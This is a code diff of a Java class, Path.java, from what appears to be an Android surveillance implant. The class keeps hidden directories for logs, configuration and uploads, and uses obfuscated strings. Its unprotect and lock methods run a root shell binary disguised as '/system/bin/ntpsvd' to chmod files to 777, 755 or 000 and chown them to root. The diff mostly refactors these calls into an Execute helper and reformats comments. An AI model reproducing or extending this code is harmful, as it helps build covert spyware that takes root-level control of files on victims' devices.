@@ -9,10 +9,6 @@
 
 package com.android.dvci.file;
 
-import java.io.File;
-import java.io.IOException;
-import java.util.Random;
-
 import android.os.Environment;
 import android.os.StatFs;
 
@@ -21,32 +17,47 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.Configuration;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.DateTime;
+import com.android.dvci.util.Execute;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
+import java.io.File;
+import java.io.IOException;
+
 // TODO: Auto-generated Javadoc
+
 /**
  * The Class Path.
  */
 public class Path {
 
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "PATH"; //$NON-NLS-1$
 
-	/** The Constant CONF_DIR. */
+	/**
+	 * The Constant CONF_DIR.
+	 */
 	private static String CONF_DIR; //$NON-NLS-1$
 	// public static final String DEBUG_DIR = "dwm/";
-	/** The Constant MARKUP_DIR. */
+	/**
+	 * The Constant MARKUP_DIR.
+	 */
 	private static String MARKUP_DIR; //$NON-NLS-1$
 
-	/** The Constant LOG_DIR. */
+	/**
+	 * The Constant LOG_DIR.
+	 */
 	private static String LOG_DIR; //$NON-NLS-1$
 	private static String UPLOADS = "qza";
 	private static String curLogFile;
 
 	public static final String LOG_FILE = "android_logs"; //$NON-NLS-1$
 
-	/** The hidden. */
+	/**
+	 * The hidden.
+	 */
 	private static String hidden;
 	private static boolean initialized = false;
 	private static String doc;
@@ -60,7 +71,7 @@ public class Path {
 
 	/**
 	 * Make dirs.
-	 * 
+	 *
 	 * @return true, if successful
 	 */
 	public static boolean makeDirs(boolean forcelocal) {
@@ -114,7 +125,7 @@ public class Path {
 
 	/**
 	 * Check.storage. //$NON-NLS-1$
-	 * 
+	 *
 	 * @param forcelocal
 	 */
 	public static void setStorage(boolean forcelocal) {
@@ -157,7 +168,7 @@ public class Path {
 
 	/**
 	 * Hidden.
-	 * 
+	 *
 	 * @return the string
 	 */
 	public static String hidden() {
@@ -185,7 +196,7 @@ public class Path {
 
 	/**
 	 * Conf.
-	 * 
+	 *
 	 * @return the string
 	 */
 	public static String conf() {
@@ -194,7 +205,7 @@ public class Path {
 
 	/**
 	 * Markup.
-	 * 
+	 *
 	 * @return the string
 	 */
 	public static String markup() {
@@ -203,13 +214,13 @@ public class Path {
 
 	/**
 	 * Logs.
-	 * 
+	 *
 	 * @return the string
 	 */
 	public static String logs() {
 		return hidden() + LOG_DIR;
 	}
-	
+
 	public static String uploads() {
 		File f = Status.getAppContext().getDir(UPLOADS, Status.getAppContext().MODE_PRIVATE);
 		return f.getAbsolutePath();
@@ -223,11 +234,11 @@ public class Path {
 	public static boolean unprotect(String path, int depth, boolean fullmode) {
 
 		File file = new File(path);
-		if(file.canRead() && !fullmode){
+		if (file.canRead() && !fullmode) {
 			return true;
 		}
-		
-		if(fullmode && file.canRead() && file.canWrite()){
+
+		if (fullmode && file.canRead() && file.canWrite()) {
 			return true;
 		}
 
@@ -244,42 +255,37 @@ public class Path {
 
 	public static boolean unprotect(String path, boolean fullmode) {
 		synchronized (Status.self().lockFramebuffer) {
-			try {
 
 
-				File file = new File(path);
+			File file = new File(path);
 
-				if (fullmode) {
-					if (file.canRead() && file.canWrite()) {
-						return true;
-					}
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (unprotect): " + Configuration.shellFile + M.e("  qzx chmod 777 ") + " " + path);
-					}
-					// TODO: Zeno, issue compatibility with camera on nexus??
-					Runtime.getRuntime().exec(Configuration.shellFile + M.e(" qzx chmod 777 ") + " " + path);
-					Utils.sleep(200);
-				} else {
-					if (file.canRead()) {
-						return true;
-					}
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (unprotect): " + Configuration.shellFile + M.e(" qzx chmod 755 ") + " " + path);
-					}
-					// h_3=/system/bin/ntpsvd qzx chmod 755
-					Runtime.getRuntime().exec(Configuration.shellFile + M.e(" qzx chmod 755 ") + " " + path);
-					Utils.sleep(200);
+			if (fullmode) {
+				if (file.canRead() && file.canWrite()) {
+					return true;
 				}
-
-				file = new File(path);
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (unprotect) return: " + path + " " + file.canRead());
+					Check.log(TAG + " (unprotect): " + Configuration.shellFile + M.e("  qzx chmod 777 ") + " " + path);
 				}
-				return file.canRead();
-			} catch (IOException ex) {
-				Check.log(TAG + " Error (unprotect): " + ex);
-				return false;
+				Execute.chmod("777", path);
+				Utils.sleep(200);
+			} else {
+				if (file.canRead()) {
+					return true;
+				}
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (unprotect): " + Configuration.shellFile + M.e(" qzx chmod 755 ") + " " + path);
+				}
+				// h_3=/system/bin/ntpsvd qzx chmod 755
+				Execute.chmod("755", path);
+				Utils.sleep(200);
 			}
+
+			file = new File(path);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (unprotect) return: " + path + " " + file.canRead());
+			}
+			return file.canRead();
+
 		}
 	}
 
@@ -307,7 +313,7 @@ public class Path {
 	public static boolean lock(String path) {
 		try {
 			// h_10=/system/bin/ntpsvd qzx chmod 000
-			Runtime.getRuntime().exec(Configuration.shellFile + M.e(" qzx chmod 000 ") + path);
+			Execute.chmod("000", path);
 
 			// h_11=/system/bin/ntpsvd fho root root
 			Runtime.getRuntime().exec(Configuration.shellFile + M.e(" fho root root ") + path);
@@ -321,9 +327,8 @@ public class Path {
 
 	/**
 	 * Removes the directory.
-	 * 
-	 * @param dir
-	 *            the dir
+	 *
+	 * @param dir the dir
 	 * @return true, if successful
 	 */
 	public static boolean removeDirectory(final String dir) {
@@ -333,9 +338,8 @@ public class Path {
 
 	/**
 	 * Creates the directory.
-	 * 
-	 * @param dir
-	 *            the dir
+	 *
+	 * @param dir the dir
 	 * @return true, if successful
 	 */
 	public static boolean createDirectory(final String dir) {
@@ -346,7 +350,7 @@ public class Path {
 
 	/**
 	 * Free space.
-	 * 
+	 *
 	 * @return the long
 	 */
 	public static long freeSpace() {
